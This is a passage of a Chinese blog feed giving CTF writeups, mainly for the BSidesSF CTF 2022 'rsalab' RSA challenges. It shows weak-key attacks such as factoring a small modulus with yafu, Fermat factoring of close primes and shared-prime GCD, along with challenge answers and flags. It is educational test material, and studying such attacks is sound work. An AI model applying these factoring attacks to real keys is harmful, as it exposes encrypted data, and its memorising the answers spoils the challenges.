gmpy2.iroot(n,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>p = sympy.nextprime(sqrt)<br>q = sympy.prevprime(sqrt)<br><span class="hljs-keyword">assert</span> p*q == n<br><br>c = <span class="hljs-number">4881495507745813082308282986718149515999022572229780274224400469722585868147852608187509420010185039618775981404400401792885121498931245511345550975906095728230775307758109150488484338848321930294974674504775451613333664851564381516108124030753196722125755223318280818682830523620259537479611172718588812979116127220273108594966911232629219195957347063537672749158765130948724281974252007489981278474243333628204092770981850816536671234821284093955702677837464584916991535090769911997642606614464990834915992346639919961494157328623213393722370119570740146804362651976343633725091450303521253550650219753876236656017</span><br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(gmpy2.powmod(c, gmpy2.invert(e, p-<span class="hljs-number">1</span>), p))))<br><br><span class="hljs-comment"># SEE&#123;i_love_really_secure_algorithms_b5c0b187fe309af0f4d35982fd961d7e&#125;</span><br></code></pre></td></tr></table></figure><p>其他的应该没时间写了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BSidesSF CTF 2022</title>
    <link href="/2022/06/06/BSidesSF-CTF-2022/"/>
    <url>/2022/06/06/BSidesSF-CTF-2022/</url>
    
    <content type="html"><![CDATA[<p>BSidesSF CTF 2022 中 rsalab 的题解。</p><span id="more"></span><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="rsalab"><a class="markdownIt-Anchor" href="#rsalab"></a> rsalab</h2><p>这题其实是三题。一共三个flag。nc连上一共有8题，可以算是对RSA算法的攻击的一个总结入门。这种题我觉得还不错。</p><h3 id="beginner"><a class="markdownIt-Anchor" href="#beginner"></a> beginner</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><pre><code class="hljs vbnet">Challenge <span class="hljs-number">1</span>:<br><br>Before your start <span class="hljs-keyword">on</span> attacking RSA, it<span class="hljs-comment">&#x27;s important to first understand</span><br>basic RSA operations <span class="hljs-built_in">like</span> encryption <span class="hljs-built_in">and</span> decryption. <span class="hljs-keyword">For</span> this<br>challenge, we have generated a <span class="hljs-keyword">public</span> <span class="hljs-keyword">key</span>. Your job <span class="hljs-built_in">is</span> <span class="hljs-keyword">to</span> encrypt the<br>provided message <span class="hljs-keyword">with</span> that <span class="hljs-keyword">public</span> <span class="hljs-keyword">key</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> the ciphertext.<br><br>RSA encryption uses the encrypting exponent, e. Decryption <span class="hljs-built_in">is</span> the same<br>mathematical operation except that it uses the decrypting exponent, d.<br><span class="hljs-keyword">If</span> you can encrypt <span class="hljs-keyword">with</span> the provided e <span class="hljs-keyword">then</span> you could decrypt (<span class="hljs-keyword">if</span> you<br>had d) just <span class="hljs-keyword">as</span> easily.<br><br>== Generated <span class="hljs-keyword">Public</span> <span class="hljs-keyword">Key</span> ==<br><span class="hljs-keyword">Public</span> Modulus (n): <span class="hljs-number">93750367580497259754994151096824772408757991545943269927577541702139349923031</span><br>Encrypting Exponent (e): <span class="hljs-number">65537</span><br><br>Message <span class="hljs-keyword">to</span> encrypt (m): <span class="hljs-number">1234567890</span><br><br>What <span class="hljs-built_in">is</span> the ciphertext (c) <span class="hljs-keyword">for</span> the message (m) <span class="hljs-keyword">using</span> the <span class="hljs-keyword">public</span> <span class="hljs-keyword">key</span>?<br><br># <span class="hljs-number">43342627728594194709171852585342053543398971218485131355267815503043000363802</span><br></code></pre></td></tr></table></figure><p>这里叫你计算一下密文。很简单。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Challenge <span class="hljs-number">2</span>:<br><br>One <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> most intimidating things <span class="hljs-keyword">about</span> RSA when you <span class="hljs-keyword">first</span> <span class="hljs-built_in">read</span><br><span class="hljs-keyword">about</span> <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> notion <span class="hljs-keyword">of</span> a <span class="hljs-string">&quot;modular inverse&quot;</span>. In our everyday lives<br>we&#x27;re pretty familiar <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> idea <span class="hljs-keyword">that</span> (<span class="hljs-number">1</span>/<span class="hljs-number">3</span>) * <span class="hljs-number">3</span> = <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">that</span> (<span class="hljs-number">5</span>/<span class="hljs-number">7</span>) *<br>(<span class="hljs-number">7</span>/<span class="hljs-number">5</span>) = <span class="hljs-number">1.</span>  That <span class="hljs-keyword">is</span>, <span class="hljs-number">1</span>/<span class="hljs-number">3</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> inverse <span class="hljs-keyword">of</span> <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-number">5</span>/<span class="hljs-number">7</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> inverse <span class="hljs-keyword">of</span><br><span class="hljs-number">7</span>/<span class="hljs-number">5.</span>  What happens though when <span class="hljs-keyword">the</span> numbers <span class="hljs-string">&quot;wrap around&quot;</span> because <span class="hljs-keyword">of</span> a<br>modulus? As one example, you can verify easily <span class="hljs-keyword">that</span> <span class="hljs-keyword">the</span> inverse <span class="hljs-keyword">of</span> <span class="hljs-number">2</span><br><span class="hljs-keyword">mod</span> <span class="hljs-number">5</span> <span class="hljs-keyword">is</span> <span class="hljs-number">3</span> <span class="hljs-keyword">mod</span> <span class="hljs-number">5</span> because <span class="hljs-number">2</span> * <span class="hljs-number">3</span> = <span class="hljs-number">6</span> <span class="hljs-keyword">and</span> <span class="hljs-number">6</span> <span class="hljs-keyword">mod</span> <span class="hljs-number">5</span> = <span class="hljs-number">1.</span> The idea <span class="hljs-keyword">that</span> <span class="hljs-number">2</span><br><span class="hljs-keyword">and</span> <span class="hljs-number">3</span> are inverses <span class="hljs-keyword">mod</span> <span class="hljs-number">5</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">at</span> all obvious. Or, even <span class="hljs-keyword">if</span> <span class="hljs-keyword">mod</span> <span class="hljs-number">5</span> <span class="hljs-keyword">is</span><br>obvious, <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> general case <span class="hljs-keyword">where</span> <span class="hljs-keyword">the</span> modulus <span class="hljs-keyword">is</span> large inverses are<br><span class="hljs-keyword">not</span> obvious.<br><br>In this challenge you are <span class="hljs-keyword">given</span> e <span class="hljs-keyword">and</span> n (<span class="hljs-keyword">as</span> well <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> factors <span class="hljs-keyword">of</span> n,<br>p <span class="hljs-keyword">and</span> q)<span class="hljs-keyword">and</span> you need <span class="hljs-keyword">to</span> find <span class="hljs-keyword">the</span> modular inverse <span class="hljs-keyword">of</span> e <span class="hljs-keyword">mod</span><br>phi(n). Recall <span class="hljs-keyword">that</span> when n has two factors phi(n) <span class="hljs-keyword">is</span> (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>).<br><br>== Generated Public Key ==<br>Public Modulus (n): <span class="hljs-number">98160686216077010306650598451384523493996357373041397278666044179163041918013</span><br>Encrypting Exponent (e): <span class="hljs-number">65537</span><br>== Secret Primes ==<br>Prime p: <span class="hljs-number">296478161395804220864289487232795949083</span><br>Prime q: <span class="hljs-number">331089095243782724782290601373623640711</span><br><br><br>What <span class="hljs-keyword">is</span> secret decrypting exponent (d) <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> couterpart <span class="hljs-keyword">of</span> e?<br><br><span class="hljs-comment"># 9919865492913591395104245136999247739392732302988070705640903774535857754853</span><br></code></pre></td></tr></table></figure><p>这里叫你算d，也就是私钥。q，p都给了，直接套公式就行。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Challenge <span class="hljs-number">3</span>:<br><br>RSA is <span class="hljs-keyword">an</span> <span class="hljs-string">&quot;asymmetric&quot;</span> encryption algorithm because <span class="hljs-keyword">the</span> key used <span class="hljs-built_in">to</span><br><span class="hljs-built_in">decrypt</span> (d) is <span class="hljs-keyword">not</span> <span class="hljs-keyword">the</span> same key that is used <span class="hljs-built_in">to</span> <span class="hljs-built_in">encrypt</span> (e). This<br>challenge will let you experience that <span class="hljs-keyword">first</span>-hand. You provide your<br>public key (n) <span class="hljs-keyword">and</span> (e) <span class="hljs-keyword">and</span> this challenge will <span class="hljs-built_in">encrypt</span> <span class="hljs-keyword">a</span> secret<br>message (m) <span class="hljs-keyword">and</span> provide you <span class="hljs-keyword">the</span> ciphertext (c). Then <span class="hljs-keyword">using</span> your<br>decrypting exponent (d) you can <span class="hljs-built_in">decrypt</span> <span class="hljs-keyword">the</span> ciphertext back <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span><br>secret message.<br><br>You are highly encouraged <span class="hljs-built_in">to</span> generate your own key here instead <span class="hljs-keyword">of</span><br>finding RSA <span class="hljs-built_in">keys</span> somewhere.<br><br>To pass this challenge <span class="hljs-keyword">the</span> n <span class="hljs-built_in">value</span> you provide must be <span class="hljs-keyword">at</span> least <span class="hljs-number">512</span><br>bits, <span class="hljs-keyword">not</span> be prime <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span> e <span class="hljs-built_in">value</span> you choose must be <span class="hljs-keyword">at</span> least<br><span class="hljs-number">100.</span> <span class="hljs-number">65537</span> is <span class="hljs-keyword">a</span> good choice <span class="hljs-keyword">for</span> e.<br><br><br>What is n <span class="hljs-keyword">for</span> your public key?<br></code></pre></td></tr></table></figure><p>这里叫我们自己输入一个n。这个n必须是512位以上的。而且e要大于100。这里我们就用自己的代码生成就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = getPrime(<span class="hljs-number">512</span>)<br>    q = getPrime(<span class="hljs-number">512</span>)<br>    n = p*q<br>    <span class="hljs-keyword">if</span> n.bit_length() == <span class="hljs-number">1024</span>:<br>        <span class="hljs-built_in">print</span>(p)<br>        <span class="hljs-built_in">print</span>(q)<br>        <span class="hljs-built_in">print</span>(n)<br>        <span class="hljs-keyword">break</span><br>        <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">10875694991805645215254668135517324330391142280861231776571929186459042877139016119856783459429519225579891325084663062250827914530190529161309788675368217</span><br><span class="hljs-string">9773480664355160440812724403080078613458928203389458915050187577280165834669443777233680522860771163143570050265715266656546946475962420080769836027441389</span><br><span class="hljs-string">106293394713836728584770048927645487102102551426684751134581194296372962576295840454537397021655815550308189352325607048529938553341796769007606529397626198231177636817810729599073564849299319322213650544188212299806442994412502877875106694978621139604395094335492409498378148226052685740633787250985960933413</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">What <span class="hljs-built_in">is</span> n <span class="hljs-keyword">for</span> your <span class="hljs-keyword">public</span> <span class="hljs-keyword">key</span>? <span class="hljs-number">106293394713836728584770048927645487102102551426684751134581194296372962576295840454537397021655815550308189352325607048529938553341796769007606529397626198231177636817810729599073564849299319322213650544188212299806442994412502877875106694978621139604395094335492409498378148226052685740633787250985960933413</span><br><br>What <span class="hljs-built_in">is</span> e <span class="hljs-keyword">for</span> your <span class="hljs-keyword">public</span> <span class="hljs-keyword">key</span>? <span class="hljs-number">65537</span><br>The ciphertext you must decrypt <span class="hljs-built_in">is</span> <span class="hljs-number">10747018944552439199720581255039720388084637469960708491916798595496468141161787523686458134928624981502687900182498988328445362551185644407711340320568644670092570168829217359152240930612218395791282480938275664550764054659163828364062000797849017204210153179497288454002327624996357110961011485773669626403</span><br><br>What was m (decrypt <span class="hljs-keyword">with</span> the d you<span class="hljs-comment">&#x27;ve made for your key!)?</span><br><br># <span class="hljs-number">193394912730819321447795805382820639777</span><br></code></pre></td></tr></table></figure><p>这里就叫我们解密了，也是直接用rsa的公式就可以。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># CTF&#123;right_so_awesome!&#125;</span><br></code></pre></td></tr></table></figure><h3 id="intermediate"><a class="markdownIt-Anchor" href="#intermediate"></a> Intermediate</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Challenge <span class="hljs-number">4</span>:<br><br>RSA <span class="hljs-built_in">is</span> only secure <span class="hljs-keyword">when</span> factoring n <span class="hljs-built_in">is</span> hard. <span class="hljs-keyword">If</span> you can factor n <span class="hljs-keyword">into</span><br>p <span class="hljs-built_in">and</span> q <span class="hljs-keyword">then</span> you can compute Euler<span class="hljs-comment">&#x27;s phi(n) (the totient function)</span><br>which, <span class="hljs-keyword">when</span> n only has two prime factors, <span class="hljs-built_in">is</span> just (p - <span class="hljs-number">1</span>) * (q -<br><span class="hljs-number">1</span>). <span class="hljs-keyword">With</span> phi(n) you can use e <span class="hljs-keyword">to</span> find d which gives you the <span class="hljs-keyword">private</span><br><span class="hljs-keyword">key</span>!<br><br><span class="hljs-keyword">In</span> this challenge, a secret message has been encrypted <span class="hljs-keyword">with</span> a very<br>weak RSA <span class="hljs-keyword">key</span>. The RSA <span class="hljs-keyword">key</span><span class="hljs-comment">&#x27;s n is approximately 128 bits meaning</span><br>(assuming they are the same size) p <span class="hljs-built_in">and</span> q are about <span class="hljs-number">64</span> bit <span class="hljs-keyword">each</span>. It<span class="hljs-comment">&#x27;s</span><br>your job <span class="hljs-keyword">to</span> decrypt the secret message <span class="hljs-keyword">by</span> breaking the RSA <span class="hljs-keyword">key</span> (factor<br>n!) <span class="hljs-built_in">and</span> <span class="hljs-keyword">then</span> determining d <span class="hljs-keyword">using</span> n<span class="hljs-comment">&#x27;s prime factors. 128-bit RSA keys</span><br>are just big enough you can<span class="hljs-comment">&#x27;t use trivial methods like trial division</span><br>but are easily small enough that almost anything more sophisticated<br>will factor them <span class="hljs-keyword">in</span> seconds.<br><br>== Generated <span class="hljs-keyword">Public</span> <span class="hljs-keyword">Key</span> ==<br><span class="hljs-keyword">Public</span> Modulus (n): <span class="hljs-number">232425609894096576101162633852002477913</span><br>Encrypting Exponent (e): <span class="hljs-number">65537</span><br><br>Message <span class="hljs-keyword">to</span> decrypt (c): <span class="hljs-number">191481802973151280528876229812887781569</span><br><br>What <span class="hljs-built_in">is</span> the plaintext (m) <span class="hljs-keyword">for</span> the encrypted message (c) <span class="hljs-keyword">for</span> the <span class="hljs-keyword">public</span> <span class="hljs-keyword">key</span>?<br></code></pre></td></tr></table></figure><p>这里说的是如果能分解n的话就能得到私钥对密文进行解密。给出的n很小，可以直接进行分解的。使用yafu来分解这个数。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs powershell">F:\CTFTools\yafu<span class="hljs-literal">-1</span>.<span class="hljs-number">34</span>&gt;yafu<span class="hljs-literal">-x64</span>.exe<br>factor(<span class="hljs-number">232425609894096576101162633852002477913</span>)<br><br><br>fac: factoring <span class="hljs-number">232425609894096576101162633852002477913</span><br>fac: <span class="hljs-keyword">using</span> pretesting plan: normal<br>fac: no tune info: <span class="hljs-keyword">using</span> qs/gnfs crossover of 95 digits<br>div: primes less than <span class="hljs-number">10000</span><br>fmt: <span class="hljs-number">1000000</span> iterations<br>rho: x^<span class="hljs-number">2</span> + <span class="hljs-number">3</span>, starting <span class="hljs-number">1000</span> iterations on C39<br>rho: x^<span class="hljs-number">2</span> + <span class="hljs-number">2</span>, starting <span class="hljs-number">1000</span> iterations on C39<br>rho: x^<span class="hljs-number">2</span> + <span class="hljs-number">1</span>, starting <span class="hljs-number">1000</span> iterations on C39<br>pm1: starting B1 = <span class="hljs-number">150</span>K, B2 = gmp<span class="hljs-literal">-ecm</span> default on C39<br>Total factoring time = <span class="hljs-number">0.0350</span> seconds<br><br><br>***factors found***<br><br>P20 = <span class="hljs-number">15829756971946610401</span><br>P20 = <span class="hljs-number">14682828694464462713</span><br><br>ans = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>得到了p，q就可以对密文进行解密了。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 8056816480286520941675656070</span><br></code></pre></td></tr></table></figure><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Challenge <span class="hljs-number">5</span>:<br><br>RSA<span class="hljs-comment">&#x27;s security relies on factorization being a hard</span><br>problem. Unfortunately there are many different factorization<br>algorithms that are quite fast <span class="hljs-keyword">in</span> certain special cases. This makes<br>generating secure RSA keys quite challenging because tons <span class="hljs-keyword">of</span> gotchas<br><span class="hljs-built_in">and</span> pitfalls must be avoided. One pitfall <span class="hljs-built_in">is</span> <span class="hljs-keyword">when</span> p <span class="hljs-built_in">and</span> q are too<br>close together because an algorithm known <span class="hljs-keyword">as</span> <span class="hljs-string">&quot;Fermat&#x27;s Factorization&quot;</span><br>can be used.<br><br><span class="hljs-keyword">In</span> this challenge, a <span class="hljs-number">2048</span> bit RSA <span class="hljs-keyword">key</span> has been generated <span class="hljs-keyword">using</span> two<br><span class="hljs-number">1024</span> bit primes, p <span class="hljs-built_in">and</span> q. The flaw <span class="hljs-built_in">is</span> that p <span class="hljs-built_in">and</span> q share approximately<br>their first <span class="hljs-number">500</span> bits. That may <span class="hljs-built_in">not</span> sound that bad since they still are<br>different <span class="hljs-keyword">in</span> their lower ~<span class="hljs-number">524</span> bits but you<span class="hljs-comment">&#x27;ll see that isn&#x27;t nearly</span><br>enough.<br><br>== Generated <span class="hljs-keyword">Public</span> <span class="hljs-keyword">Key</span> ==<br><span class="hljs-keyword">Public</span> Modulus (n): <span class="hljs-number">25240054906527308715123083513191206839625173490523222251828485342363714336785380565865997526799064756242760495920245470292094107572885037758544627319924131106469206061990262762473830559723089863710658174860933300953411483624472662692904888669381554917178242116550796585404855973132973772929016519378021061815488878618803864877487986518434955737510882129986289035083960210216734245350444938463326983372446311710518586992606167860499851814468283028623132695394370326534082149664539102785030529344576581865843167524739917242789374803048921371234481347145388496209423571350226798734660569948183356006127158058090767513593</span><br>Encrypting Exponent (e): <span class="hljs-number">65537</span><br><br>Message <span class="hljs-keyword">to</span> decrypt (c): <span class="hljs-number">10426074392847872381473627569957969180320053109752606227916079994083532053799703036065905282122615431437721866313171294013350515428252537309345482269880415619442294601156752585446010009194624361395148280761278099888525138605830066285813688990522801677857932428538220521983981413448850469004996008927906933730792935466887940039979883069300623808947669972015213977651647997784626563669640738954071792582917241174307901215091315797664765124678924852716239603589657100939596203624339673928916386333510127266261894581633834712017193560070996878504040955960547901590264230976711955989542053963668368387177301946035693856117</span><br><br>What <span class="hljs-built_in">is</span> the plaintext (m) <span class="hljs-keyword">for</span> the encrypted message (c) <span class="hljs-keyword">for</span> the <span class="hljs-keyword">public</span> <span class="hljs-keyword">key</span>?<br></code></pre></td></tr></table></figure><p>这里说的是如果生成n的两个素数相距很近的话，很容易被分解出来。p和q的高位大部分相同，但是这不安全。这可以使用费马分解法来对n进行分解。也就是他说的 “Fermat’s Factorization”。yafu里面集成了很多n的分解方法所以这里我们使用yafu进行分解。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs powershell">F:\CTFTools\yafu<span class="hljs-literal">-1</span>.<span class="hljs-number">34</span>&gt;yafu<span class="hljs-literal">-x64</span>.exe<br>factor(<span class="hljs-number">25240054906527308715123083513191206839625173490523222251828485342363714336785380565865997526799064756242760495920245470292094107572885037758544627319924131106469206061990262762473830559723089863710658174860933300953411483624472662692904888669381554917178242116550796585404855973132973772929016519378021061815488878618803864877487986518434955737510882129986289035083960210216734245350444938463326983372446311710518586992606167860499851814468283028623132695394370326534082149664539102785030529344576581865843167524739917242789374803048921371234481347145388496209423571350226798734660569948183356006127158058090767513593</span>)<br><br><br>fac: factoring <span class="hljs-number">25240054906527308715123083513191206839625173490523222251828485342363714336785380565865997526799064756242760495920245470292094107572885037758544627319924131106469206061990262762473830559723089863710658174860933300953411483624472662692904888669381554917178242116550796585404855973132973772929016519378021061815488878618803864877487986518434955737510882129986289035083960210216734245350444938463326983372446311710518586992606167860499851814468283028623132695394370326534082149664539102785030529344576581865843167524739917242789374803048921371234481347145388496209423571350226798734660569948183356006127158058090767513593</span><br>fac: <span class="hljs-keyword">using</span> pretesting plan: normal<br>fac: no tune info: <span class="hljs-keyword">using</span> qs/gnfs crossover of 95 digits<br>div: primes less than <span class="hljs-number">10000</span><br>fmt: <span class="hljs-number">1000000</span> iterations<br>Total factoring time = <span class="hljs-number">7.6796</span> seconds<br><br><br>***factors found***<br><br>P309 = <span class="hljs-number">158871189668005283415144657986551193302869428022001726220647816798498163786655160734083642077926887626968994149548144770437583756497334125901064680461238653949200872152467592040526765560776849130898789230056872627669722209677289335370789152455332871728170193718878900033253778086216110326217359038965751457767</span><br>P309 = <span class="hljs-number">158871189668005283415144657986551193302869428022001726220647816798498163786655160734083642077926887626968994149548144770437583756497334125901064680461234832110504013303470429626460988959707000583806418183588832922742389554954078372113253029216897932455245679734943989771289650860903610854223547207721942050079</span><br><br>ans = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>这里我们就得到了p与q。进行解密即可。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 85264668993792422195045856889255535675920204275110143264715798301682527037703</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Challenge <span class="hljs-number">6</span>:<br><br>It <span class="hljs-keyword">is</span> critically important that the primes used <span class="hljs-keyword">in</span> an RSA key have<br>never been used <span class="hljs-keyword">in</span> <span class="hljs-keyword">any</span> other RSA key. <span class="hljs-keyword">If</span> two keys happen <span class="hljs-keyword">to</span> <span class="hljs-keyword">share</span> a<br>prime <span class="hljs-keyword">then</span> a quick comparison <span class="hljs-keyword">using</span> the GCD algorithm <span class="hljs-keyword">between</span> the two<br>n <span class="hljs-keyword">values</span> will find a common prime. This <span class="hljs-keyword">is</span> a common flaw <span class="hljs-keyword">for</span> keys<br><span class="hljs-keyword">generated</span> <span class="hljs-keyword">on</span> devices <span class="hljs-keyword">with</span> poor (<span class="hljs-keyword">or</span> <span class="hljs-keyword">no</span>) entropy <span class="hljs-keyword">on</span> first boot.<br><br>This challenge generates two keys that <span class="hljs-keyword">share</span> a prime. Use the GCD<br><span class="hljs-keyword">between</span> the two n <span class="hljs-keyword">to</span> find the common prime.<br><br>== <span class="hljs-keyword">Generated</span> <span class="hljs-built_in">Public</span> Key <span class="hljs-number">1</span> ==<br><span class="hljs-built_in">Public</span> Modulus (n): <span class="hljs-number">25766855849012170602215974276512994665527760103232878510877708579134451117925205685988667478305686774909581308048305405982227012155215071376134036940929029662904505877622287438422321334710416342122246755031087867738529234615302073381335900455830870395122148361228482894414857023560773160530764583158671668598804795236806439696444767416669004606904236852625407455032822014231606087073213831281114887244532839729675040811323228917519504038450191315875150823702300759184612618800826323992940766242448628052050372979262990010935907002585341542207395142877707331416760094045455941053408610742527475497038936581984374880709</span><br>Encrypting Exponent (e): <span class="hljs-number">65537</span><br><span class="hljs-keyword">Encrypted</span> message (c): <span class="hljs-number">10525814866510137434899274998082698726988868256233514176953502719354264032410185277614127761527071749571758119230375451756494965691920242823875047761236402904697195895757175042349370909038642191817523007191322103279536254571467901947532676209111044078805574511874421763608159336854724603736343437950821917939678565773065914042640814861551433414991462029439854218529934675178281414333981877196921950767775395220428028907601554437040987071711361174143526222051997404012801968532202680596542050070864790765315160191871148699455255350919126797448710611287281082665133892808503848186989158095870812598832558333246789042676</span><br><br>== <span class="hljs-keyword">Generated</span> <span class="hljs-built_in">Public</span> Key <span class="hljs-number">2</span> ==<br><span class="hljs-built_in">Public</span> Modulus (n): <span class="hljs-number">23029445296375982244621042067356938067600932656366159682913502418113458794974570308801738092925111529731228548404356478117663790755942048917363075846055763270676348368932404632553120873938932115409549042302048379540139242329521312179497517707113409555264863436910061516286482903931874204248958042186907817570230042112727883343124487662643844328226394430868012939455393801202299874213974171731230732650780391625138430545738601970201658394385606885566557862983885797334286100689371547075235155161498539779469617285566915877747705913072389949483202393235902365901491091866493162015415874138858126412365811099585224212299</span><br>Encrypting Exponent (e): <span class="hljs-number">65537</span><br><span class="hljs-keyword">Encrypted</span> message (c): <span 